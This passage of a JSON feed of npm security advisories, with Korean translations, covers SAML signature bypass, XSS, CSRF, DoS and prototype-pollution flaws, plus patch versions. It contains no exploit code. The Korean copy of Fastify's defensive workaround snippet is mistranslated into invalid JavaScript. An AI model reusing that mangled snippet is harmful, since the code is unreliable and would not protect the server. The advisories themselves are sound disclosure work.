    "descriptionKR": "### 영향\n\n원격 공격자가 passport-saml을 사용하여 웹사이트에서 SAML 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 XML 요소를 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n### 패치\n\n사용자는 passport-saml 3.2.2 이상으로 업그레이드해야 합니다. 이 문제는 v4.0.0-beta.5 이전의 `node-saml` 베타 릴리스에도 있었습니다.\n\n### 해결 방법\n\nSAML 인증을 비활성화합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [node-saml 저장소](https://github.com/node-saml/node-saml/discussions)에서 토론 열기\n\n### 크레딧\n\n* Google Project Zero의 Felix Wilhelm"
  },
  {
    "description": "### Impact\n\nA remote attacker may be able to bypass SAML authentication on a website using passport-saml. A successful attack requires that the attacker is in possession of an arbitrary IDP signed XML element. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n### Patches\n\nUsers should upgrade to passport-saml 3.2.2 or newer. The issue was also present in the beta releases of `node-saml` before v4.0.0-beta.5.\n\n### Workarounds\n\nDisable SAML authentication.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in the [node-saml repo](https://github.com/node-saml/node-saml/discussions)\n\n### Credits\n\n* Felix Wilhelm of Google Project Zero\n",
    "identifiers": "GHSA : GHSA-m974-647v-whv7\nCVE : CVE-2022-39299",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:24Z",
    "publishedAt": "2022-10-12T22:05:41Z",
    "references": "https://github.com/node-saml/passport-saml/security/advisories/GHSA-m974-647v-whv7\nhttps://github.com/node-saml/passport-saml/commit/8b7e3f5a91c8e5ac7e890a0c90bc7491ce33155e\nhttps://github.com/node-saml/passport-saml/releases/tag/v3.2.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39299\nhttp://packetstormsecurity.com/files/169826/Node-saml-Root-Element-Signature-Bypass.html\nhttps://github.com/advisories/GHSA-m974-647v-whv7",
    "name": "node-saml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.0.0-beta.5",
    "identifier": "4.0.0-beta.5",
    "descriptionKR": "### 영향\n\n원격 공격자가 passport-saml을 사용하여 웹사이트에서 SAML 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 XML 요소를 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n### 패치\n\n사용자는 passport-saml 3.2.2 이상으로 업그레이드해야 합니다. 이 문제는 v4.0.0-beta.5 이전의 `node-saml` 베타 릴리스에도 있었습니다.\n\n### 해결 방법\n\nSAML 인증을 비활성화합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [node-saml 저장소](https://github.com/node-saml/node-saml/discussions)에서 토론 열기\n\n### 크레딧\n\n* Google Project Zero의 Felix Wilhelm"
  },
  {
    "description": "### Impact\n\nA remote attacker may be able to bypass SAML authentication on a website using passport-saml. A successful attack requires that the attacker is in possession of an arbitrary IDP signed XML element. Depending on the IDP used, fully unauthenticated attacks (e.g without access to a valid user) might also be feasible if generation of a signed message can be triggered.\n\n### Patches\n\nUsers should upgrade to passport-saml 3.2.2 or newer. The issue was also present in the beta releases of `node-saml` before v4.0.0-beta.5.\n\n### Workarounds\n\nDisable SAML authentication.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open a discussion in the [node-saml repo](https://github.com/node-saml/node-saml/discussions)\n\n### Credits\n\n* Felix Wilhelm of Google Project Zero\n",
    "identifiers": "GHSA : GHSA-m974-647v-whv7\nCVE : CVE-2022-39299",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:03:24Z",
    "publishedAt": "2022-10-12T22:05:41Z",
    "references": "https://github.com/node-saml/passport-saml/security/advisories/GHSA-m974-647v-whv7\nhttps://github.com/node-saml/passport-saml/commit/8b7e3f5a91c8e5ac7e890a0c90bc7491ce33155e\nhttps://github.com/node-saml/passport-saml/releases/tag/v3.2.2\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39299\nhttp://packetstormsecurity.com/files/169826/Node-saml-Root-Element-Signature-Bypass.html\nhttps://github.com/advisories/GHSA-m974-647v-whv7",
    "name": "passport-saml",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 3.2.2",
    "identifier": "3.2.2",
    "descriptionKR": "### 영향\n\n원격 공격자가 passport-saml을 사용하여 웹사이트에서 SAML 인증을 우회할 수 있습니다. 공격이 성공하려면 공격자가 임의의 IDP 서명 XML 요소를 소유하고 있어야 합니다. 사용된 IDP에 따라 서명된 메시지 생성이 트리거될 수 있는 경우 완전히 인증되지 않은 공격(예: 유효한 사용자에 대한 액세스 권한 없음)도 가능할 수 있습니다.\n\n### 패치\n\n사용자는 passport-saml 3.2.2 이상으로 업그레이드해야 합니다. 이 문제는 v4.0.0-beta.5 이전의 `node-saml` 베타 릴리스에도 있었습니다.\n\n### 해결 방법\n\nSAML 인증을 비활성화합니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [node-saml 저장소](https://github.com/node-saml/node-saml/discussions)에서 토론 열기\n\n### 크레딧\n\n* Google Project Zero의 Felix Wilhelm"
  },
  {
    "description": "Metro UI v4.4.0 to v4.5.1 was discovered to contain a reflected cross-site scripting (XSS) vulnerability via the Javascript function. User input is not properly sanitized before rendering in the `textarea` component.",
    "identifiers": "GHSA : GHSA-633r-r4p8-pw3w\nCVE : CVE-2022-41376",
    "severity": "MODERATE",
    "updatedAt": "2023-02-03T05:02:16Z",
    "publishedAt": "2022-10-11T19:00:26Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-41376\nhttps://alicangonullu.org/konu/138\nhttps://youtu.be/_wzGVpX54Rc\nhttps://github.com/advisories/GHSA-633r-r4p8-pw3w",
    "name": "metro4",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.4.0, <= 4.5.1",
    "descriptionKR": "Metro UI v4.4.0에서 v4.5.1은 Javascript 기능을 통해 반영된 XSS(교차 사이트 스크립팅) 취약점을 포함하는 것으로 발견되었습니다. `textarea` 구성 요소에서 렌더링하기 전에 사용자 입력이 제대로 삭제되지 않습니다."
  },
  {
    "description": "### Impact\nThe [graphql-upload](https://www.npmjs.com/package/graphql-upload) npm package can execute GraphQL operations contained in `content-type: multipart/form-data` POST requests. Because they are POST requests, they can contain GraphQL mutations. Because they use `content-type: multipart/form-data`, they can be \"simple requests\" which are not preflighted by browsers.\n\nIf your GraphQL server uses `graphql-upload` and uses `SameSite=None` cookies for authentication, then JS on any origin can cause browsers to send cookie-authenticated mutations to your GraphQL server, which will be executed without checking your CORS policy first. (The attack won't be able to see the response to the mutation if your CORS policy is set up properly, but the side effects of the mutation will still happen.)\n\nAdditionally, if your GraphQL server uses `graphql-upload` and relies on network properties for security (whether by explicitly looking at the client's IP address or by only being available on a private network), then JS on any origin can cause browsers (which may be on a private network or have an allowed IP address) to send mutations to your GraphQL server, which will be executed without checking your CORS policy first. (This attack does not require your server to use cookies. It is in some cases prevented by some browsers such as Chrome.)\n\nApollo Server 2 bundled `graphql-upload` and enabled it by default, so by default, Apollo Server 2 servers are vulnerable to these CSRF attacks.  (Apollo Server 1 did not bundle `graphql-upload`. Apollo Server 3 no longer bundles `graphql-upload`, although AS3's docs do document how to manually integrate with `graphql-upload`.) It is enabled even if your server makes no use of the upload functionality.\n\nIf you are running Apollo Server 2 (older than v2.25.4) and do not specify `uploads: false` to `new ApolloServer`, then you are vulnerable to this CSRF mutation attack.\n\nWe recently introduced an opt-in CSRF prevention feature in Apollo Server 3.7.  This feature successfully protects against CSRF even if you have manually integrated your AS3.7 server with `graphql-upload`. However, this feature is not available for Apollo Server 2.\n\n### Patches\nIf you are using Apollo Server 2 and do *not* actually use uploads in your schema (ie, the `Upload` scalar is not used as the argument to any field or in any input object definition, and you do not specify `uploads` to `new ApolloServer`), then upgrading to Apollo Server 2.25.4 will automatically disable `graphql-upload` in your server.  This will fix the CSRF mutation vulnerability.\n\nUpgrading to v2.25.4 does still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations. To protect yourself against these potentially lower impact CSRF attack, we encourage upgrading to Apollo Server v3.7 and enabling CSRF prevention. See [the Apollo Server 3 migration guide](https://www.apollographql.com/docs/apollo-server/migration/) and the [CSRF prevention docs](https://www.apollographql.com/docs/apollo-server/security/cors/#preventing-cross-site-request-forgery-csrf) for details.\n\nIf you are actively using the uploads feature with Apollo Server 2, then upgrading to v2.25.4 will not disable the feature and you will still be vulnerable. You should instead upgrade to v3.7 and enable the CSRF prevention feature.\n\nIf you are manually integrating the `graphql-upload` package with any version of Apollo Server (or any Node GraphQL server) and need to continue using the feature, then you must enable some sort of CSRF prevention feature to fix this vulnerability. We recommend the CSRF prevention feature in Apollo Server 3.7.\n\n### Workarounds\nInstead of upgrading your Apollo Server 2 server, you can specify `uploads: false` to `new ApolloServer` to disable the `graphql-upload` integration and protect against CSRF mutations. (Only do this if you do not actually use the uploads feature in your server!) This will still leave your server vulnerable to non-mutation CSRF attacks such as timing attacks against query operations; you need to upgrade to v3.7 and enable CSRF prevention to protect against these attacks.\n\n### Related work\n- [PR adding a Security section to the GraphQL multipart request spec](https://github.com/jaydenseric/graphql-multipart-request-spec/pull/64)",
    "identifiers": "GHSA : GHSA-2p3c-p3qw-69r4",
    "severity": "MODERATE",
    "updatedAt": "2023-07-31T20:39:04Z",
    "publishedAt": "2022-10-12T14:15:48Z",
    "references": "https://github.com/apollographql/apollo-server/security/advisories/GHSA-2p3c-p3qw-69r4\nhttps://github.com/jaydenseric/graphql-multipart-request-spec/pull/64\nhttps://github.com/apollographql/apollo-server/commit/82d44985ddca8e61557957d67f41e9c1a705a5ca\nhttps://github.com/advisories/GHSA-2p3c-p3qw-69r4",
    "name": "apollo-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 2.0.0, < 2.25.4",
    "identifier": "2.25.4",
    "descriptionKR": "### 영향\n[graphql-upload](https://www.npmjs.com/package/graphql-upload) npm 패키지는 `content-type: multipart/form-data` POST 요청에 포함된 GraphQL 작업을 실행할 수 있습니다. POST 요청이기 때문에 GraphQL 변형을 포함할 수 있습니다. `content-type: multipart/form-data`를 사용하기 때문에 브라우저에서 미리 실행하지 않는 \"단순 요청\"일 수 있습니다.\n\nGraphQL 서버가 `graphql-upload`를 사용하고 인증을 위해 `SameSite=None` 쿠키를 사용하는 경우 모든 출처의 JS는 브라우저가 쿠키 인증 변형을 GraphQL 서버로 보내도록 할 수 있습니다. 이는 CORS 정책을 먼저 확인하지 않고 실행됩니다. . (CORS 정책이 제대로 설정되어 있으면 공격은 돌연변이에 대한 대응을 볼 수 없지만 돌연변이의 부작용은 여전히 ​​발생합니다.)\n\n또한 GraphQL 서버가 `graphql-upload`를 사용하고 보안을 위해 네트워크 속성에 의존하는 경우(클라이언트의 IP 주소를 명시적으로 확인하거나 사설 네트워크에서만 사용할 수 있음) 모든 출처의 JS는 브라우저를 유발할 수 있습니다. 사설 네트워크에 있거나 허용된 IP 주소가 있을 수 있음) GraphQL 서버에 변형을 보내면 먼저 CORS 정책을 확인하지 않고 실행됩니다. (이 공격은 서버에서 쿠키를 사용할 필요가 없습니다. 경우에 따라 Chrome과 같은 일부 브라우저에서 차단됩니다.)\n\nApollo Server 2는 `graphql-upload`를 번들로 제공하고 기본적으로 활성화하므로 기본적으로 Apollo Server 2 서버는 이러한 CSRF 공격에 취약합니다. (Apollo 서버 1은 `graphql-upload`를 번들로 제공하지 않습니다. Apollo 서버 3은 더 이상 `graphql-upload`를 번들로 제공하지 않습니다. AS3 문서에는 `graphql-upload`와 수동으로 통합하는 방법이 문서화되어 있습니다.) 업로드 기능을 사용하지 않습니다.\n\nApollo Server 2(v2.25.4 이전)를 실행 중이고 `uploads: false`를 `new ApolloServer`에 지정하지 않으면 이 CSRF 변이 공격에 취약합니다.\n\n최근 Apollo Server 3.7에서 옵트인 CSRF 방지 기능을 도입했습니다. 이 기능은 AS3.7 서버를 `graphql-upload`와 수동으로 통합한 경우에도 CSRF로부터 성공적으로 보호합니다. 그러나 이 기능은 Apollo Server 2에서는 사용할 수 없습니다.\n\n### 패치\nApollo Server 2를 사용 중이고 실제로 스키마에서 업로드를 사용하지 *않는* 경우(즉, `Upload` 스칼라는 어떤 필드나 입력 객체 정의에 대한 인수로 사용되지 않으며 `uploads`를 지정하지 않습니다. to `new ApolloServer`로), Apollo Server 2.25.4로 업그레이드하면 서버에서 `graphql-upload`가 자동으로 비활성화됩니다. 이렇게 하면 CSRF 변이 취약점이 수정됩니다.\n\nv2.25.4로 업그레이드해도 서버는 여전히 쿼리 작업에 대한 타이밍 공격과 같은 비변형 CSRF 공격에 취약합니다. 잠재적으로 영향이 적은 CSRF 공격으로부터 자신을 보호하려면 Apollo Server v3.7로 업그레이드하고 CSRF 방지를 활성화하는 것이 좋습니다. [Apollo Server 3 마이그레이션 가이드](https://www.apollographql.com/docs/apollo-server/migration/) 및 [CSRF 예방 문서](https://www.apollographql.com/docs/apollo)를 참조하세요. -server/security/cors/#preventing-cross-site-request-forgery-csrf)를 참조하십시오.\n\nApollo Server 2에서 업로드 기능을 적극적으로 사용하는 경우 v2.25.4로 업그레이드해도 기능이 비활성화되지 않으며 여전히 취약합니다. 대신 v3.7로 업그레이드하고 CSRF 방지 기능을 활성화해야 합니다.\n\n`graphql-upload` 패키지를 모든 버전의 Apollo 서버(또는 모든 Node GraphQL 서버)와 수동으로 통합하고 이 기능을 계속 사용해야 하는 경우 이 취약점을 수정하려면 일종의 CSRF 방지 기능을 활성화해야 합니다. Apollo Server 3.7의 CSRF 방지 기능을 권장합니다.\n\n### 해결 방법\nApollo Server 2 서버를 업그레이드하는 대신 'uploads: false'를 'new ApolloServer'에 지정하여 'graphql-upload' 통합을 비활성화하고 CSRF 변형으로부터 보호할 수 있습니다. (실제로 서버에서 업로드 기능을 사용하지 않는 경우에만 이 작업을 수행하십시오!) 이로 인해 서버는 여전히 쿼리 작업에 대한 타이밍 공격과 같은 비변형 CSRF 공격에 취약한 상태가 됩니다. 이러한 공격으로부터 보호하려면 v3.7로 업그레이드하고 CSRF 방지를 활성화해야 합니다.\n\n### 관련된 일\n- [GraphQL 멀티파트 요청 사양에 보안 섹션 추가 PR](https://github.com/jaydenseric/graphql-multipart-request-spec/pull/64)"
  },
  {
    "description": "## Withdrawn\n\nThis advisory has been withdrawn because the maintainers of `@xmldom/xmldom` and multiple third parties disputed the validity of the issue. Attempts to create or replicate a proof of concept have been unsuccessful.\n\n## Original Description\n\n### Impact\nA prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/xmldom/xmldom/pull/437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n* Add information to https://github.com/xmldom/xmldom/issues/436\n",
    "identifiers": "GHSA : GHSA-9pgh-qqpf-7wqj\nCVE : CVE-2022-37616",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:07:15Z",
    "publishedAt": "2022-10-11T20:42:57Z",
    "withdrawnAt": "2022-11-08T19:35:06Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-9pgh-qqpf-7wqj\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-37616\nhttps://github.com/xmldom/xmldom/issues/436\nhttps://github.com/xmldom/xmldom/pull/437\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L1\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L3\nhttps://github.com/xmldom/xmldom/blob/master/CHANGELOG.md#076\nhttps://lists.debian.org/debian-lts-announce/2022/10/msg00023.html\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1327776560\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/advisories/GHSA-9pgh-qqpf-7wqj",
    "name": "@xmldom/xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 0.9.0-beta.1",
    "identifier": "0.9.0-beta.2",
    "descriptionKR": "## 철회\n\n이 권고는 `@xmldom/xmldom`의 관리자 및 여러 제3자가 문제의 유효성에 대해 이의를 제기했기 때문에 철회되었습니다. 개념 증명을 만들거나 복제하려는 시도는 성공하지 못했습니다.\n\n## 원본 설명\n\n### 영향\nxmldom(@xmldom/xmldom으로 게시됨) 패키지의 dom.js에 있는 함수 사본에 프로토타입 오염 취약성이 존재합니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.2`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n없음\n\n### 참조\nhttps://github.com/xmldom/xmldom/pull/437\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요.\n* https://github.com/xmldom/xmldom/issues/436에 정보 추가"
  },
  {
    "description": "## Withdrawn\n\nThis advisory has been withdrawn because the maintainers of `@xmldom/xmldom` and multiple third parties disputed the validity of the issue. Attempts to create or replicate a proof of concept have been unsuccessful.\n\n## Original Description\n\n### Impact\nA prototype pollution vulnerability exists in the function copy in dom.js in the xmldom (published as @xmldom/xmldom) package.\n\n### Patches\nUpdate to `@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3` (dist-tag `latest`) or `@xmldom/xmldom@>=0.9.0-beta.2` (dist-tag `next`).\n\n### Workarounds\nNone\n\n### References\nhttps://github.com/xmldom/xmldom/pull/437\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@xmldom.org\n* Add information to https://github.com/xmldom/xmldom/issues/436\n",
    "identifiers": "GHSA : GHSA-9pgh-qqpf-7wqj\nCVE : CVE-2022-37616",
    "severity": "CRITICAL",
    "updatedAt": "2023-02-02T05:07:15Z",
    "publishedAt": "2022-10-11T20:42:57Z",
    "withdrawnAt": "2022-11-08T19:35:06Z",
    "references": "https://github.com/xmldom/xmldom/security/advisories/GHSA-9pgh-qqpf-7wqj\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-37616\nhttps://github.com/xmldom/xmldom/issues/436\nhttps://github.com/xmldom/xmldom/pull/437\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L1\nhttps://github.com/xmldom/xmldom/blob/bc36efddf9948aba15618f85dc1addfc2ac9d7b2/lib/dom.js#L3\nhttps://github.com/xmldom/xmldom/blob/master/CHANGELOG.md#076\nhttps://lists.debian.org/debian-lts-announce/2022/10/msg00023.html\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1319412826\nhttps://github.com/xmldom/xmldom/issues/436#issuecomment-1327776560\nhttps://dl.acm.org/doi/abs/10.1145/3488932.3497769\nhttps://dl.acm.org/doi/pdf/10.1145/3488932.3497769\nhttp://users.encs.concordia.ca/~mmannan/publications/JS-vulnerability-aisaccs2022.pdf\nhttps://github.com/advisories/GHSA-9pgh-qqpf-7wqj",
    "name": "xmldom",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.6.0",
    "descriptionKR": "## 철회\n\n이 권고는 `@xmldom/xmldom`의 관리자 및 여러 제3자가 문제의 유효성에 대해 이의를 제기했기 때문에 철회되었습니다. 개념 증명을 만들거나 복제하려는 시도는 성공하지 못했습니다.\n\n## 원본 설명\n\n### 영향\nxmldom(@xmldom/xmldom으로 게시됨) 패키지의 dom.js에 있는 함수 사본에 프로토타입 오염 취약성이 존재합니다.\n\n### 패치\n`@xmldom/xmldom@~0.7.6`, `@xmldom/xmldom@~0.8.3`(dist-tag `latest`) 또는 `@xmldom/xmldom@>=0.9.0-beta.2`로 업데이트 (dist-tag `다음`).\n\n### 해결 방법\n없음\n\n### 참조\nhttps://github.com/xmldom/xmldom/pull/437\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* security@xmldom.org로 이메일을 보내주세요.\n* https://github.com/xmldom/xmldom/issues/436에 정보 추가"
  },
  {
    "description": "### Impact\nAn attacker can send an invalid `Content-Type` header that can cause the application to crash, leading to a possible Denial of Service attack. Only the v4.x line is affected.\n\n(This was updated: upon a close inspection, v3.x is not affected after all).\n\n### Patches\nYes, update to `> v4.8.0`.\n\n### Workarounds\nYou can reject the malicious content types before the body parser enters in action.\n```js\n  const badNames = Object.getOwnPropertyNames({}.__proto__)\n  fastify.addHook('onRequest', async (req, reply) => {\n    for (const badName of badNames) {\n      if (req.headers['content-type'].indexOf(badName) > -1) {\n        reply.code(415)\n        throw new Error('Content type not supported')\n      }\n    }\n  })\n```\n\n### References\n\nSee the HackerOne report [#1715536](https://hackerone.com/bugs?report_id=1715536&subject=fastify)\n\n### For more information\n[Fastify security policy](https://github.com/fastify/fastify/security/policy)\n",
    "identifiers": "GHSA : GHSA-455w-c45v-86rg\nCVE : CVE-2022-39288",
    "severity": "HIGH",
    "updatedAt": "2023-02-02T05:02:16Z",
    "publishedAt": "2022-10-11T13:45:14Z",
    "references": "https://github.com/fastify/fastify/security/advisories/GHSA-455w-c45v-86rg\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39288\nhttps://github.com/fastify/fastify/commit/fbb07e8dfad74c69cd4cd2211aedab87194618e3\nhttps://github.com/fastify/fastify/security/policy\nhttps://hackerone.com/bugs?report_id=1715536&subject=fastify\nhttps://github.com/advisories/GHSA-455w-c45v-86rg",
    "name": "fastify",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.8.1",
    "identifier": "4.8.1",
    "descriptionKR": "### 영향\n공격자는 잘못된 'Content-Type' 헤더를 보낼 수 있으며 이로 인해 응용 프로그램이 충돌하여 서비스 거부 공격이 발생할 수 있습니다. v4.x 라인만 영향을 받습니다.\n\n(업데이트되었습니다: 면밀히 검사하면 v3.x는 결국 영향을 받지 않습니다).\n\n### 패치\n예, `> v4.8.0`으로 업데이트합니다.\n\n### 해결 방법\n본문 파서가 실행되기 전에 악성 콘텐츠 유형을 거부할 수 있습니다.\n```js\n  const badNames = Object.getOwnPropertyNames({}.__proto__)\n  fastify.addHook('onRequest', async (req, reply) => {\n    for (badNames의 const badName) {\n      if (req.headers['content-type'].indexOf(badName) > -1) {\n        답장.코드(415)\n        throw new Error('지원되지 않는 콘텐츠 유형')\n      }\n    }\n  })\n```\n\n### 참조\n\nHackerOne 보고서 [#1715536](https://hackerone.com/bugs?report_id=1715536&subject=fastify)를 참조하십시오.\n\n### 자세한 내용은\n[Fastify 보안 정책](https://github.com/fastify/fastify/security/policy)"
  },
  {
    "description": "### Impact\n_What kind of vulnerability is it? Who is impacted?_\n\nThe default cookie name (and documentation recommendation) was prefixed with `Host__` instead of `__Host-`. The point of this prefix is for additional security, to ensure that, when no domain option is provided in the cookie options, we can guarantee the cookie came from the correct domain.\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nYes, the problem is patched from version 2.2.1, this will not be back ported, but you can use the workaround described below.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nYou can work around this by providing a custom `cookieName` as part of the options, which is correctly prefixed with `__Host-`.\n\n### References\n_Are there any links users can visit to find out more?_\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cookie-with-__host-prefix\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Reach out on the [Psifi Solutions Discord](https://psifisolutions.com/discord) in the `#psifi-support` channel\n",
    "identifiers": "GHSA : GHSA-jjmg-x456-w976",
    "severity": "LOW",
    "updatedAt": "2023-01-09T05:00:45Z",
    "publishedAt": "2022-10-10T20:59:02Z",
    "references": "https://github.com/Psifi-Solutions/csrf-csrf/security/advisories/GHSA-jjmg-x456-w976\nhttps://github.com/Psifi-Solutions/csrf-csrf/commit/8f1ce8db97d945a4bb7f39f0b43c6041fa83d675\nhttps://github.com/advisories/GHSA-jjmg-x456-w976",
    "name": "csrf-csrf",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.2.1",
    "identifier": "2.2.1",
    "descriptionKR": "### 영향\n_어떤 종류의 취약점입니까? 누가 영향을 받습니까?_\n\n기본 쿠키 이름(및 설명서 권장 사항)에는 `__Host-` 대신 `Host__` 접두사가 붙습니다. 이 접두사의 요점은 쿠키 옵션에 도메인 옵션이 제공되지 않을 때 쿠키가 올바른 도메인에서 온 것임을 보장할 수 있도록 추가 보안을 위한 것입니다.\n\n### 패치\n_문제가 패치되었나요? 사용자는 어떤 버전으로 업그레이드해야 합니까?_\n\n예, 문제는 버전 2.2.1에서 패치되었으며 다시 이식되지는 않지만 아래 설명된 해결 방법을 사용할 수 있습니다.\n\n### 해결 방법\n_사용자가 업그레이드하지 않고 취약점을 수정하거나 치료할 수 있는 방법이 있습니까?_\n\n`__Host-`라는 접두사가 올바르게 붙은 옵션의 일부로 사용자 지정 `cookieName`을 제공하여 이 문제를 해결할 수 있습니다.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cookie-with-__host-prefix\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* `#psifi-support` 채널의 [Psifi Solutions Discord](https://psifisolutions.com/discord)에 문의하세요."
  },
  {
    "description": "NocoDB prior to 0.92.0 allows actors to insert large characters into the input field `New Project` on the create field, which can cause a Denial of Service (DoS) via a crafted HTTP request. Version 0.92.0 fixes this issue.",
    "identifiers": "GHSA : GHSA-grv6-m753-3w2g\nCVE : CVE-2022-3423",
    "severity": "MODERATE",
    "updatedAt": "2023-07-21T19:33:42Z",
    "publishedAt": "2022-10-07T18:16:01Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-3423\nhttps://github.com/nocodb/nocodb/commit/000ecd886738b965b5997cd905825e3244f48b95\nhttps://huntr.dev/bounties/94639d8e-8301-4432-ab80-e76e1346e631\nhttps://github.com/advisories/GHSA-grv6-m753-3w2g",
    "name": "nocodb",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.92.0",
    "identifier": "0.92.0",
    "descriptionKR": "0.92.0 이전의 NocoDB에서는 액터가 생성 필드의 '새 프로젝트' 입력 필드에 큰 문자를 삽입할 수 있습니다. 이로 인해 조작된 HTTP 요청을 통해 서비스 거부(DoS)가 발생할 수 있습니다. 버전 0.92.0은 이 문제를 해결합니다."
  },
  {
    "description": "### Impact\n\nWeak encryption on CSRF so tokens can be read by malicious attackers. \n\n### Patches\n\nProblems have been patched as of v1.1.0\n\n### Workarounds\n\nUpgrade to v1.1.0\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html \n\n### For more information\n\nSubmit an issue at [the github repo](https://github.com/valexandersaulys/tiny-csrf)",
    "identifiers": "GHSA : GHSA-pj2c-h76w-vv6f\nCVE : CVE-2022-39287",
    "severity": "HIGH",
    "updatedAt": "2023-02-01T05:01:58Z",
    "publishedAt": "2022-10-07T21:23:18Z",
    "references": "https://github.com/valexandersaulys/tiny-csrf/security/advisories/GHSA-pj2c-h76w-vv6f\nhttps://github.com/valexandersaulys/tiny-csrf/commit/8eead6da3b56e290512bbe8d20c2c5df3be317ba\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-39287\nhttps://github.com/advisories/GHSA-pj2c-h76w-vv6f",
    "name": "tiny-csrf",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.1.0",
    "identifier": "1.1.0",
    "descriptionKR": "### 영향\n\nCSRF의 약한 암호화로 악의적인 공격자가 토큰을 읽을 수 있습니다.\n\n### 패치\n\n문제는 v1.1.0부터 패치되었습니다.\n\n### 해결 방법\n\nv1.1.0으로 업그레이드\n\n### 참조\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html\n\n### 자세한 내용은\n\n[github 저장소](https://github.com/valexandersaulys/tiny-csrf)에서 문제 제출"
  },
  {
